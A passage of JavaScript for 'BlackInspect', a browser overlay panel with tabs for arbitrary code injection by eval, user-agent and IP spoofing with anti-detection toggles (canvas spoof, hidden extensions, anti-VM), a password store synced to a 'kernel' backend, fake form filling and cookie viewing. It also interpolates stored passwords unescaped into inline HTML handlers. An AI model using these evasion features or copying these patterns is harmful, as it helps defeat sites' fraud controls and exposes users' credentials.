      el.innerHTML = `<span>${item.i}</span><span>${item.t}</span>`;
      el.onmouseenter = () => (el.style.background = "#21262d");
      el.onmouseleave = () => (el.style.background = "transparent");
      el.onclick = () => {
        item.a();
        menu.remove();
      };
      menu.appendChild(el);
    });
    D.body.appendChild(menu);
    setTimeout(() => {
      D.addEventListener("click", () => menu.remove(), { once: true });
      D.addEventListener(
        "keydown",
        (e) => {
          if (e.key === "Escape") menu.remove();
        },
        { once: true },
      );
    }, 0);
  }

  function loadPdfjs() {
    return new Promise((res, rej) => {
      if (pdfjsLib) return res(pdfjsLib);
      const s = D.createElement("script");
      s.src =
        "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js";
      s.onload = () => {
        pdfjsLib = W.pdfjsLib;
        pdfjsLib.GlobalWorkerOptions.workerSrc =
          "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js";
        res(pdfjsLib);
      };
      s.onerror = rej;
      D.head.appendChild(s);
    });
  }

  async function takeScreenshot() {
    if (!html2canvas) {
      alert("html2canvas not loaded");
      return;
    }
    const canvas = await html2canvas(D.body, {
      scrollY: -W.scrollY,
      useCORS: true,
      scale: 1,
      width: D.documentElement.scrollWidth,
      height: D.documentElement.scrollHeight,
      windowWidth: D.documentElement.scrollWidth,
      windowHeight: D.documentElement.scrollHeight,
      x: 0,
      y: 0,
      ignoreElements: (el) => el.id === BS || el.id === "bi-launcher",
    });
    canvas.toBlob((blob) => {
      const a = D.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "screenshot_" + D.title.replace(/[^a-z0-9]/gi, "_") + ".png";
      a.click();
      URL.revokeObjectURL(a.href);
    }, "image/png");
  }

  function dlBlob(blob, filename) {
    const a = D.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    a.click();
    URL.revokeObjectURL(a.href);
  }

  function resetPanelPos() {
    const w = W.innerWidth,
      h = W.innerHeight;
    const pw = Math.min(w - 20, 940),
      ph = Math.min(h - 20, 580);
    S.panelLeft = 10;
    S.panelTop = 10;
    S.panelWidth = pw;
    S.panelHeight = ph;
    if (panel) {
      panel.style.left = "10px";
      panel.style.top = "10px";
      panel.style.width = pw + "px";
      panel.style.height = ph + "px";
    }
  }

  D.addEventListener(
    "keydown",
    (e) => {
      if (
        e.ctrlKey &&
        e.key === "z" &&
        panel &&
        panel.style.display !== "none"
      ) {
        e.preventDefault();
        e.stopPropagation();
        resetPanelPos();
      }
    },
    true,
  );

  function createPanel() {
    if (panel) {
      panel.style.display = "flex";
      return;
    }
    const isRTL = S.uiLang === "fa";
    const pw = S.panelWidth,
      ph = S.panelHeight;
    const pl = S.panelLeft,
      pt = S.panelTop;

    panel = D.createElement("div");
    panel.id = BS;
    panel.dir = isRTL ? "rtl" : "ltr";
    panel.style.cssText = `
        position:fixed;top:${pt}px;left:${pl}px;
        width:${pw}px;height:${ph}px;
        background:#0d1117;color:#c9d1d9;
        border:1px solid #30363d;border-radius:12px;
        box-shadow:0 16px 64px rgba(0,0,0,0.85);
        z-index:2147483646;overflow:hidden;
        display:flex;flex-direction:column;
        resize:both;min-width:360px;min-height:340px;
        max-width:calc(100vw - 10px);max-height:calc(100vh - 10px);
        opacity:${S.panelOpacity};
    `;

    const st = D.createElement("style");
    st.id = "bi-panel-style";
    st.textContent = `
        #${BS}{direction:${isRTL ? "rtl" : "ltr"}!important;unicode-bidi:isolate!important;}
        #${BS} *{direction:inherit;box-sizing:border-box;}
        #${BS} input,#${BS} textarea,#${BS} select{
            background:#161b22;color:#c9d1d9;border:1px solid #30363d;
            border-radius:6px;padding:6px 10px;width:100%;
            font-family:inherit;font-size:inherit;outline:none;
            transition:border-color .2s;
        }
        #${BS} input:focus,#${BS} textarea:focus,#${BS} select:focus{border-color:#58a6ff;}
        #${BS} button{
            cursor:pointer;border:none;border-radius:6px;
            padding:7px 14px;font-family:inherit;font-size:inherit;
            transition:opacity .15s,transform .1s;
        }
        #${BS} button:hover{opacity:.85;}
        #${BS} button:active{transform:scale(.97);}
        #${BS} h4{margin:8px 0 6px;color:#58a6ff;font-size:11px;text-transform:uppercase;letter-spacing:.06em;}
        #${BS} .bi-card{background:#161b22;padding:12px;border-radius:8px;margin-bottom:10px;border:1px solid #21262d;}
        #${BS} .bi-row{display:flex;gap:6px;align-items:center;margin-bottom:6px;}
        #${BS} .bi-grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
        #${BS} .bi-badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;}
        #${BS} .bi-sep{border:none;border-top:1px solid #21262d;margin:8px 0;}
        #${BS} .bi-muted{color:#8b949e;font-size:11px;}
        #${BS} label{color:#8b949e;font-size:11px;display:block;margin-bottom:3px;}
        #${BS} .bi-scroll{overflow-y:auto;max-height:200px;}
        #${BS} .bi-code{background:#161b22;padding:8px;border-radius:6px;font-size:11px;color:#3fb950;white-space:pre-wrap;word-break:break-all;max-height:140px;overflow-y:auto;}
        #${BS} input[type=range]{padding:0;background:transparent;border:none;accent-color:#58a6ff;}
        #${BS} input[type=checkbox],#${BS} input[type=radio]{width:auto;display:inline;margin:0 4px 0 0;accent-color:#58a6ff;cursor:pointer;}
        #${BS} .bi-check-row{display:flex;align-items:center;gap:6px;margin-bottom:4px;}
        #${BS} .bi-check-row label{margin:0;color:#c9d1d9;cursor:pointer;}
        #${BS} .bi-tag{background:#21262d;border:1px solid #30363d;border-radius:4px;padding:2px 7px;font-size:10px;color:#8b949e;}
        #${BS} .bi-btn-green{background:#238636;color:#fff;}
        #${BS} .bi-btn-blue{background:#1f6feb;color:#fff;}
        #${BS} .bi-btn-red{background:#da3633;color:#fff;}
        #${BS} .bi-btn-orange{background:#c5862c;color:#fff;}
        #${BS} .bi-btn-dim{background:#21262d;color:#c9d1d9;border:1px solid #30363d;}
        #${BS} .bi-pass-entry{
            background:#161b22;border:1px solid #21262d;border-radius:8px;
            padding:10px 12px;margin-bottom:6px;
            display:flex;justify-content:space-between;align-items:center;gap:8px;
        }
        #${BS} .bi-todo-item{
            background:#161b22;border:1px solid #21262d;border-radius:8px;
            padding:10px 12px;margin-bottom:6px;
        }
        #${BS} .bi-empty{
            text-align:center;padding:32px 16px;color:#8b949e;font-size:12px;
        }
        #${BS} .bi-empty-icon{font-size:36px;display:block;margin-bottom:8px;}
        #${BS} .bi-status{font-size:11px;margin-top:6px;min-height:16px;}
        #${BS} .bi-ok{color:#3fb950;}
        #${BS} .bi-err{color:#f85149;}
        #${BS} .bi-warn{color:#d29922;}
    `;
    panel.appendChild(st);

    const fontSt = D.createElement("style");
    fontSt.id = "bi-font-style";
    fontSt.textContent = `#${BS},#${BS} *{font-family:'${S.fontFamily}',Consolas,monospace!important;font-size:${S.fontSize}px!important;}`;
    panel.appendChild(fontSt);

    const header = D.createElement("div");
    header.style.cssText = `
        background:#161b22;padding:10px 14px;
        cursor:move;display:flex;justify-content:space-between;
        align-items:center;border-bottom:1px solid #21262d;
        user-select:none;flex-shrink:0;
    `;
    header.innerHTML = `
        <div style="display:flex;align-items:center;gap:10px;">
            <span style="color:#58a6ff;font-weight:700;font-size:14px;">⚙ BlackInspect</span>
            <span style="color:#30363d;font-size:10px;">v7.0</span>
            <span id="bi-kernel-dot" style="width:7px;height:7px;border-radius:50%;background:${S.kernelOnline ? "#3fb950" : "#f85149"};display:inline-block;" title="${S.kernelOnline ? "Kernel online" : "Kernel offline"}"></span>
        </div>
        <div style="display:flex;gap:10px;align-items:center;">
            <span id="bi-fps-hud" style="font-size:10px;color:#6a9955;min-width:50px;text-align:right;"></span>
            <span id="bi-close" style="cursor:pointer;color:#8b949e;font-size:20px;line-height:1;padding:0 4px;" title="Close">×</span>
        </div>
    `;
    panel.appendChild(header);

    const tabBar = D.createElement("div");
    tabBar.style.cssText = `
        display:flex;background:#161b22;border-bottom:1px solid #21262d;
        overflow-x:auto;flex-shrink:0;padding:0 4px;
        scrollbar-width:none;
    `;

    const TABS = [
      "Info",
      "Vars",
      "Inject",
      "Spoof",
      "Pass",
      "Storage",
      "Tools",
      "Network",
      "Security",
      "PDF",
      "Tasks",
      "Settings",
    ];
    TABS.forEach((name) => {
      const btn = D.createElement("button");
      btn.dataset.tab = name;
      btn.textContent = T(name);
      btn.style.cssText = `
            background:transparent;color:#8b949e;border:none;border-bottom:2px solid transparent;
            padding:8px 10px;cursor:pointer;font-family:inherit;font-size:11px;
            white-space:nowrap;flex-shrink:0;transition:color .15s;
        `;
      btn.addEventListener("click", () => showTab(name));
      tabBar.appendChild(btn);
    });
    panel.appendChild(tabBar);

    const content = D.createElement("div");
    content.id = "bi-content";
    content.style.cssText = `padding:12px;overflow-y:auto;flex:1;background:#0d1117;`;
    panel.appendChild(content);

    D.body.appendChild(panel);

    D.getElementById("bi-close").onclick = () => {
      panel.style.display = "none";
    };

    let dragging = false,
      dx = 0,
      dy = 0;
    header.addEventListener("mousedown", (e) => {
      dragging = true;
      dx = e.clientX - panel.offsetLeft;
      dy = e.clientY - panel.offsetTop;
      D.body.style.userSelect = "none";
    });
    D.addEventListener("mousemove", (e) => {
      if (!dragging) return;
      panel.style.left = e.clientX - dx + "px";
      panel.style.top = e.clientY - dy + "px";
      S.panelLeft = e.clientX - dx;
      S.panelTop = e.clientY - dy;
    });
    D.addEventListener("mouseup", () => {
      dragging = false;
      D.body.style.userSelect = "";
      S.panelWidth = panel.offsetWidth;
      S.panelHeight = panel.offsetHeight;
    });

    function showTab(tab) {
      [...tabBar.children].forEach((b) => {
        const active = b.dataset.tab === tab;
        b.style.borderBottom = active
          ? "2px solid #58a6ff"
          : "2px solid transparent";
        b.style.color = active ? "#58a6ff" : "#8b949e";
      });
      content.innerHTML = "";
      S.activeTab = tab;
      renderTab(tab);
    }

    function renderTab(tab) {
      const c = content;

      if (tab === "Info") {
        c.innerHTML = `
            <div style="color:#58a6ff;font-weight:700;margin-bottom:4px;font-size:13px;">🌐 <span id="inf-title"></span></div>
            <div class="bi-muted" style="word-break:break-all;margin-bottom:10px;" id="inf-url"></div>
            <div class="bi-card" id="inf-net"></div>
            <div class="bi-card" id="inf-page"></div>
            <div class="bi-card"><h4>📋 Response Headers</h4><div id="inf-rh" class="bi-muted bi-scroll" style="font-size:11px;"></div></div>`;
        D.getElementById("inf-title").textContent = D.title;
        D.getElementById("inf-url").textContent = location.href;
        (async () => {
          const nav = performance.getEntriesByType("navigation")[0];
          D.getElementById("inf-net").innerHTML = `
                    <h4>📡 Network</h4>
                    <div>🖥 Server: <span id="srv" style="color:#58a6ff;">…</span></div>
                    <div>📡 IP: <span id="pgip" style="color:#58a6ff;">…</span></div>
                    <div>🔒 Protocol: ${nav?.nextHopProtocol || "N/A"}</div>`;
          D.getElementById("inf-page").innerHTML = `
                    <h4>📄 Page</h4>
                    <div>📝 Desc: ${D.querySelector('meta[name="description"]')?.content || "—"}</div>
                    <div>🌐 Charset: ${D.characterSet}</div>
                    <div>📱 Viewport: ${D.querySelector('meta[name="viewport"]')?.content || "—"}</div>
                    <div style="margin-top:4px;">
                        🔗 ${D.links.length} links &nbsp; 🖼 ${D.images.length} imgs &nbsp;
                        📜 ${D.scripts.length} scripts &nbsp; 🎨 ${D.styleSheets.length} css &nbsp;
                        📋 ${D.forms.length} forms &nbsp; 🗂 ${D.querySelectorAll("*").length} nodes
                    </div>
                    <div>💾 Size: ${(new Blob([D.documentElement.outerHTML]).size / 1024).toFixed(1)} KB &nbsp;
                         ⏱ Load: ${performance.timing.loadEventEnd - performance.timing.navigationStart}ms</div>`;
          try {
            const r = await fetch(location.href, { method: "HEAD" });
            D.getElementById("srv").textContent =
              r.headers.get("Server") || "—";
            let rh = "";
            r.headers.forEach(
              (v, k) =>
                (rh += `<span style="color:#58a6ff;">${k}</span>: ${v}<br>`),
            );
            D.getElementById("inf-rh").innerHTML =
              rh || '<span class="bi-muted">No headers</span>';
          } catch (e) {
            D.getElementById("srv").textContent = "Error";
          }
          try {
            const r2 = await fetch(
              `https://dns.google/resolve?name=${location.hostname}&type=A`,
            );
            const d = await r2.json();
            D.getElementById("pgip").textContent = d.Answer?.[0]?.data || "N/A";
          } catch (e) {
            D.getElementById("pgip").textContent = "Error";
          }
        })();
      } else if (tab === "Vars") {
        c.innerHTML = `
            <div class="bi-row">
                <input id="varFilter" placeholder="${T("Filter...")}" style="flex:1;">
                <button id="scanVars" class="bi-btn-blue">🔄 ${T("Scan")}</button>
                <button id="exportVars" class="bi-btn-dim">💾 ${T("Export")}</button>
            </div>
            <div id="varList" class="bi-scroll" style="max-height:380px;font-size:11px;background:#161b22;padding:8px;border-radius:6px;"></div>`;
        const getBase = () => {
          const ifr = D.createElement("iframe");
          ifr.src = "about:blank";
          D.body.appendChild(ifr);
          const k = Object.keys(ifr.contentWindow || {});
          ifr.remove();
          return k;
        };
        const base = getBase();
        const scan = () => {
          const lst = D.getElementById("varList");
          lst.innerHTML = "⏳";
          const filter = D.getElementById("varFilter").value.toLowerCase();
          const keys = Object.keys(W)
            .filter((k) => !base.includes(k))
            .filter((k) => !filter || k.toLowerCase().includes(filter))
            .sort();
          if (!keys.length) {
            lst.innerHTML = '<span class="bi-muted">No variables found.</span>';
            return;
          }
          lst.innerHTML = keys
            .map((k) => {
              const v = W[k],
                t = typeof v;
              let d = "";
              try {
                d =
                  t === "function"
                    ? "ƒ()"
                    : t === "object" && v
                      ? JSON.stringify(v).substring(0, 80) + "…"
                      : t === "string"
                        ? `"${v.substring(0, 60)}"`
                        : String(v).substring(0, 60);
              } catch (e) {
                d = "(err)";
              }
              return `<div style="margin-bottom:3px;cursor:pointer;padding:2px 4px;border-radius:3px;" onmouseenter="this.style.background='#21262d'" onmouseleave="this.style.background='transparent'" onclick="var v=prompt('New value for ${k}:',String(window['${k}']||''));if(v!==null){try{eval('window.${k}='+v);}catch(e){window['${k}']=v;}}"><span style="color:#9cdcfe;">${k}</span> <span style="color:#6a9955;">(${t})</span> = <span style="color:#ce9178;">${d}</span></div>`;
            })
            .join("");
        };
        D.getElementById("scanVars").onclick = scan;
        D.getElementById("varFilter").oninput = scan;
        D.getElementById("exportVars").onclick = () => {
          const d = Object.keys(W)
            .filter((k) => !base.includes(k))
            .reduce((a, k) => {
              try {
                a[k] = W[k];
              } catch (e) {}
              return a;
            }, {});
          dlBlob(
            new Blob([JSON.stringify(d, null, 2)], {
              type: "application/json",
            }),
            "variables.json",
          );
        };
        scan();
      } else if (tab === "Inject") {
        c.innerHTML = `
            <div class="bi-card">
                <h4>▶ Run Code</h4>
                <textarea id="codeInj" style="height:150px;resize:vertical;font-family:inherit;" placeholder="// JavaScript code here..."></textarea>
                <button id="runCode" class="bi-btn-orange" style="width:100%;margin-top:6px;">▶ Run</button>
                <div id="injOut" class="bi-code" style="margin-top:8px;"></div>
            </div>`;
        D.getElementById("runCode").onclick = () => {
          const code = D.getElementById("codeInj").value;
          const out = D.getElementById("injOut");
          try {
            out.textContent = "✅ Return: " + String(eval(code));
          } catch (e) {
            out.textContent = "❌ " + e.message;
            out.style.color = "#f85149";
          }
        };
      } else if (tab === "Spoof") {
        const tpls = {
          chrome_win: {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
            plat: "Win32",
            lang: "en-US",
          },
          firefox_linux: {
            ua: "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
            plat: "Linux x86_64",
            lang: "en-US",
          },
          safari_mac: {
            ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
            plat: "MacIntel",
            lang: "en-US",
          },
          edge_win: {
            ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            plat: "Win32",
            lang: "en-US",
          },
          iphone: {
            ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
            plat: "iPhone",
            lang: "en-US",
          },
          android: {
            ua: "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/126.0.6478.122 Mobile Safari/537.36",
            plat: "Linux armv8l",
            lang: "en-US",
          },
        };
        c.innerHTML = `
            <div class="bi-grid2">
            <div>
                <div class="bi-card">
                    <h4>📡 Identity Spoof</h4>
                    <label>Template</label>
                    <select id="tpl" style="margin-bottom:8px;">
                        <option value="">— Custom —</option>
                        <option value="chrome_win">Chrome / Windows</option>
                        <option value="firefox_linux">Firefox / Linux</option>
                        <option value="safari_mac">Safari / macOS</option>
                        <option value="edge_win">Edge / Windows</option>
                        <option value="iphone">iPhone Safari</option>
                        <option value="android">Android Chrome</option>
                    </select>
                    <label>${T("Fake IP")}</label>
                    <div class="bi-row"><input id="fakeIP" value="${S.ip}" style="flex:1;"><button id="randIP" class="bi-btn-dim" style="flex-shrink:0;">🎲</button></div>
                    <label>${T("User-Agent")}</label><input id="ua" value="${S.ua}" style="margin-bottom:6px;">
                    <label>${T("Platform")}</label><input id="plat" value="${S.platform}" style="margin-bottom:6px;">
                    <label>${T("Language")}</label><input id="lang" value="${S.language}" style="margin-bottom:8px;">
                    <div class="bi-check-row"><input type="checkbox" id="bos" ${S.breakOnStart ? "checked" : ""}><label for="bos">${T("Break on load")}</label></div>
                    <div class="bi-row" style="margin-top:8px;">
                        <button id="startSpoof" class="bi-btn-blue" style="flex:1;">▶ ${T("Start Spoofing")}</button>
                        <button id="stopSpoof" class="bi-btn-red" style="flex:1;" ${S.spoofActive ? "" : "disabled"}>⏹ ${T("Stop Spoofing")}</button>
                    </div>
                    <div id="spoofStatus" class="bi-status ${S.spoofActive ? "bi-ok" : ""}">${S.spoofActive ? "✅ " + T("Spoofing active") : ""}</div>
                </div>
            </div>
            <div>
                <div class="bi-card">
                    <h4>🛡 Anti-Detection</h4>
                    <div class="bi-check-row"><input type="checkbox" id="cvToggle" ${S.canvasSpoof ? "checked" : ""}><label for="cvToggle">${T("Canvas Spoof")}</label></div>
                    <div class="bi-check-row"><input type="checkbox" id="tvToggle" ${S.tabVisSpoof ? "checked" : ""}><label for="tvToggle">${T("Tab Visibility")}</label></div>
                    <div class="bi-check-row"><input type="checkbox" id="heToggle" ${S.hideExt ? "checked" : ""}><label for="heToggle">${T("Hide Extensions")}</label></div>
                    <div class="bi-check-row"><input type="checkbox" id="biToggle" ${S.spoofBuildID ? "checked" : ""}><label for="biToggle">${T("Spoof BuildID")}</label></div>
                    <div class="bi-check-row"><input type="checkbox" id="vmToggle" ${S.antiVM ? "checked" : ""}><label for="vmToggle">${T("Anti-VM")}</label></div>
                    <div class="bi-muted" style="margin-top:6px;">Changes apply on next page load</div>
                </div>
                <div class="bi-card" style="margin-top:0;">
                    <h4>💾 Profile</h4>
                    <button id="exportCfg" class="bi-btn-blue" style="width:100%;margin-bottom:4px;">📥 Export Profile</button>
                    <button id="importCfg" class="bi-btn-dim" style="width:100%;margin-bottom:4px;">📤 Import Profile</button>
                    <input type="file" id="importFile" style="display:none" accept=".json">
                    <div id="cfgStatus" class="bi-status"></div>
                </div>
            </div>
            </div>`;

        D.getElementById("tpl").onchange = function () {
          const t = tpls[this.value];
          if (t) {
            D.getElementById("ua").value = t.ua;
            D.getElementById("plat").value = t.plat;
            D.getElementById("lang").value = t.lang;
          }
        };
        D.getElementById("randIP").onclick = () =>
          (D.getElementById("fakeIP").value = Array.from({ length: 4 }, () =>
            Math.floor(Math.random() * 256),
          ).join("."));
        D.getElementById("startSpoof").onclick = () => {
          const ip = D.getElementById("fakeIP").value.trim(),
            ua = D.getElementById("ua").value.trim(),
            plat = D.getElementById("plat").value.trim(),
            lang = D.getElementById("lang").value.trim();
          if (!ip && !ua && !plat && !lang) {
            D.getElementById("spoofStatus").textContent =
              "⚠ Fill at least one field.";
            return;
          }
          S.spoofActive = true;
          S.ip = ip;
          S.ua = ua;
          S.platform = plat;
          S.language = lang;
          S.breakOnStart = D.getElementById("bos").checked;
          applySpoofing(ip, ua, plat, lang);
          D.getElementById("spoofStatus").className = "bi-status bi-ok";
          D.getElementById("spoofStatus").textContent =
            "✅ " + T("Spoofing active");
          D.getElementById("startSpoof").disabled = true;
          D.getElementById("stopSpoof").disabled = false;
        };
        D.getElementById("stopSpoof").onclick = () => {
          S.spoofActive = false;
          D.getElementById("spoofStatus").className = "bi-status bi-muted";
          D.getElementById("spoofStatus").textContent =
            "⏹ Stopped (reload to fully restore)";
          D.getElementById("startSpoof").disabled = false;
          D.getElementById("stopSpoof").disabled = true;
        };
        D.getElementById("exportCfg").onclick = () => {
          const d = {
            ip: S.ip,
            ua: S.ua,
            platform: S.platform,
            language: S.language,
            breakOnStart: S.breakOnStart,
          };
          dlBlob(
            new Blob([JSON.stringify(d, null, 2)], {
              type: "application/json",
            }),
            S.profileFile,
          );
          D.getElementById("cfgStatus").textContent = "✅ Exported.";
        };
        D.getElementById("importCfg").onclick = () =>
          D.getElementById("importFile").click();
        D.getElementById("importFile").onchange = (e) => {
          const f = e.target.files[0];
          if (!f) return;
          const r = new FileReader();
          r.onload = (ev) => {
            try {
              const d = JSON.parse(ev.target.result);
              D.getElementById("fakeIP").value = d.ip || "";
              D.getElementById("ua").value = d.ua || "";
              D.getElementById("plat").value = d.platform || "";
              D.getElementById("lang").value = d.language || "";
              D.getElementById("cfgStatus").textContent = "✅ Profile loaded.";
            } catch (ex) {
              D.getElementById("cfgStatus").textContent = "❌ Invalid file.";
            }
          };
          r.readAsText(f);
        };
        ["cvToggle", "tvToggle", "heToggle", "biToggle", "vmToggle"].forEach(
          (id, i) => {
            const keys = [
              "canvasSpoof",
              "tabVisSpoof",
              "hideExt",
              "spoofBuildID",
              "antiVM",
            ];
            const fns = [
              applyCanvasSpoof,
              applyTabVisSpoof,
              applyHideExt,
              applyBuildIDSpoof,
              applyAntiVM,
            ];
            D.getElementById(id).onchange = function () {
              S[keys[i]] = this.checked;
              if (this.checked) fns[i]();
            };
          },
        );
      } else if (tab === "Pass") {
        c.innerHTML = `
            <div class="bi-grid2" style="gap:10px;">
            <div>
                <div class="bi-card">
                    <h4>🔐 ${T("Password Generator")}</h4>
                    <label>${T("Length")}: <b id="lenVal">16</b></label>
                    <input type="range" id="passLen" min="6" max="64" value="16" style="width:100%;margin-bottom:8px;" oninput="document.getElementById('lenVal').textContent=this.value">
                    <div class="bi-check-row"><input type="checkbox" id="incNum" checked><label for="incNum">${T("Numbers")}</label></div>
                    <div class="bi-check-row"><input type="checkbox" id="incUpper" checked><label for="incUpper">${T("Uppercase")}</label></div>
                    <div class="bi-check-row"><input type="checkbox" id="incLower" checked><label for="incLower">${T("Lowercase")}</label></div>
                    <div class="bi-check-row"><input type="checkbox" id="incSpec"><label for="incSpec">${T("Special Chars")}</label></div>
                    <button id="genPass" class="bi-btn-dim" style="width:100%;margin-top:8px;">🔀 ${T("Generate")}</button>
                    <div style="margin-top:8px;word-break:break-all;color:#58a6ff;font-size:13px;font-weight:600;min-height:20px;" id="genOut"></div>
                    <div class="bi-row" style="margin-top:8px;">
                        <button id="copyPass" class="bi-btn-dim" style="flex:1;">📋 Copy</button>
                        <button id="usePass" class="bi-btn-green" style="flex:1;">🖊 ${T("Use Password")}</button>
                    </div>
                </div>
                <div class="bi-card">
                    <h4>👤 Fake Data</h4>
                    <div class="bi-grid2" style="gap:4px;">
                        <button id="fillName" class="bi-btn-dim">👤 Name</button>
                        <button id="fillEmail" class="bi-btn-dim">📧 Email</button>
                        <button id="fillPhone" class="bi-btn-dim">📞 Phone</button>
                        <button id="fillAll" class="bi-btn-blue">⚡ Fill All</button>
                    </div>
                    <div id="fakeOut" class="bi-status bi-ok"></div>
                </div>
            </div>
            <div>
                <div class="bi-card">
                    <h4>💾 ${T("Saved Passwords")}</h4>
                    <input id="saveUser" placeholder="${T("Username")}" style="margin-bottom:4px;">
                    <div class="bi-row">
                        <button id="saveEntry" class="bi-btn-green" style="flex:1;">💾 ${T("Save")}</button>
                        <button id="exportPass" class="bi-btn-dim" style="flex:1;">📤 ${T("Export")}</button>
                        <button id="importPass" class="bi-btn-dim" style="flex:1;">📥 ${T("Import")}</button>
                    </div>
                    <input type="file" id="importPassFile" style="display:none" accept=".json">
                    <div id="passStatus" class="bi-status"></div>
                    <hr class="bi-sep">
                    <div id="savedList" class="bi-scroll" style="max-height:240px;"></div>
                </div>
            </div>
            </div>`;

        const chars = {
          num: "0123456789",
          upper: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
          lower: "abcdefghijklmnopqrstuvwxyz",
          spec: "!@#$%^&*()_+-=[]{}|;:,.<>?",
        };
        const gen = () => {
          let ch = "";
          if (D.getElementById("incNum").checked) ch += chars.num;
          if (D.getElementById("incUpper").checked) ch += chars.upper;
          if (D.getElementById("incLower").checked) ch += chars.lower;
          if (D.getElementById("incSpec").checked) ch += chars.spec;
          if (!ch) return "";
          const len = parseInt(D.getElementById("passLen").value);
          let p = "";
          for (let i = 0; i < len; i++)
            p += ch[Math.floor(Math.random() * ch.length)];
          return p;
        };
        D.getElementById("genPass").onclick = () =>
          (D.getElementById("genOut").textContent = gen());
        D.getElementById("copyPass").onclick = () =>
          N.clipboard?.writeText(D.getElementById("genOut").textContent);
        D.getElementById("usePass").onclick = () => {
          const p = D.getElementById("genOut").textContent;
          if (!p) return;
          D.querySelectorAll("input[type=password]").forEach((i) => {
            i.value = p;
            i.dispatchEvent(new Event("input", { bubbles: true }));
          });
        };
        const fnames = ["Ali", "Sara", "Reza", "Maryam", "Mohammad", "Fatemeh"];
        const emails = ["test@example.com", "user@mail.com", "info@site.org"];
        const phones = ["09123456789", "09351234567", "09187654321"];
        const rnd = (a) => a[Math.floor(Math.random() * a.length)];
        const fillAttr = (attr, val) => {
          let c = 0;
          D.querySelectorAll("input:not([type=hidden])").forEach((inp) => {
            const n = (
              (inp.name || "") +
              " " +
              (inp.id || "") +
              " " +
              (inp.placeholder || "")
            ).toLowerCase();
            if (n.includes(attr)) {
              inp.value = val;
              inp.dispatchEvent(new Event("input", { bubbles: true }));
              c++;
            }
          });
          return c;
        };
        D.getElementById("fillName").onclick = () => {
          fillAttr("name", rnd(fnames));
          D.getElementById("fakeOut").textContent = "✅ Name filled.";
        };
        D.getElementById("fillEmail").onclick = () => {
          fillAttr("email", rnd(emails));
          D.getElementById("fakeOut").textContent = "✅ Email filled.";
        };
        D.getElementById("fillPhone").onclick = () => {
          fillAttr("phone", rnd(phones));
          fillAttr("mobile", rnd(phones));
          D.getElementById("fakeOut").textContent = "✅ Phone filled.";
        };
        D.getElementById("fillAll").onclick = () => {
          let c =
            fillAttr("name", rnd(fnames)) +
            fillAttr("email", rnd(emails)) +
            fillAttr("phone", rnd(phones));
          D.getElementById("fakeOut").textContent = `✅ ${c} fields filled.`;
        };

        const renderPassList = async () => {
          const lst = D.getElementById("savedList");
          const pws = await loadPasswordsKernel();
          if (!pws.length) {
            lst.innerHTML = `<div class="bi-empty"><span class="bi-empty-icon">🔒</span>${T("No passwords saved")}</div>`;
            return;
          }
          lst.innerHTML = pws
            .map(
              (e, i) => `
                <div class="bi-pass-entry">
                    <div style="min-width:0;">
                        <div style="font-weight:600;font-size:12px;color:#58a6ff;">${e.domain}</div>
                        <div class="bi-muted">${e.username}</div>
                        <div style="font-size:11px;color:#6a9955;cursor:pointer;" onclick="this.textContent=this.textContent==='●●●●●●●●'?'${e.password}':'●●●●●●●●'">●●●●●●●●</div>
                    </div>
                    <div style="display:flex;gap:4px;flex-shrink:0;">
                        <button class="bi-btn-dim" style="padding:4px 8px;font-size:11px;" onclick="navigator.clipboard&&navigator.clipboard.writeText('${e.password}')">📋</button>
                        <button class="bi-btn-red" style="padding:4px 8px;font-size:11px;" onclick="deletePass(${i})">✕</button>
                    </div>
                </div>`,
            )
            .join("");
        };
        W.deletePass = async (idx) => {
          if (S.kernelOnline) {
            try {
              await kernelFetch("/passwords/delete", {
                method: "DELETE",
                body: JSON.stringify({ index: idx }),
              });
            } catch (e) {}
          }
          const arr = S.passwords;
          arr.splice(idx, 1);
          S.passwords = arr;
          renderPassList();
        };
        D.getElementById("saveEntry").onclick = async () => {
          const user = D.getElementById("saveUser").value.trim(),
            pass = D.getElementById("genOut").textContent;
          if (!user || !pass) {
            D.getElementById("passStatus").textContent =
              "⚠ Generate a password first.";
            return;
          }
          await savePasswordKernel({
            domain: location.hostname,
            username: user,
            password: pass,
            url: location.href,
          });
          renderPassList();
          D.getElementById("passStatus").className = "bi-status bi-ok";
          D.getElementById("passStatus").textContent =
            "✅ " + T("Password saved");
        };
        D.getElementById("exportPass").onclick = async () => {
          const pws = await loadPasswordsKernel();
          dlBlob(
            new Blob([JSON.stringify(pws, null, 2)], {
              type: "application/json",
            }),
            S.passFile,
          );
        };
        D.getElementById("importPass").onclick = () =>
          D.getElementById("importPassFile").click();
        D.getElementById("importPassFile").onchange = (e) => {
          const f = e.target.files[0];
          if (!f) return;
          const r = new FileReader();
          r.onload = (ev) => {
            try {
              S.passwords = JSON.parse(ev.target.result);
              renderPassList();
            } catch (ex) {}
          };
          r.readAsText(f);
        };
        D.getElementById("genOut").textContent = gen();
        renderPassList();
      } else if (tab === "Storage") {
        c.innerHTML = `
            <div class="bi-grid2">
            <div>
                <div class="bi-card">
                    <h4>🍪 ${T("Cookies")}</h4>
                    <button id="viewCookies" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">View Cookies</button>
                    <div id="cookieView" class="bi-scroll bi-code" style="max-height:180px;font-size:11px;"></div>
                </div>
                <div class="bi-card">
                    <h4>📦 ${T("LocalStorage")}</h4>
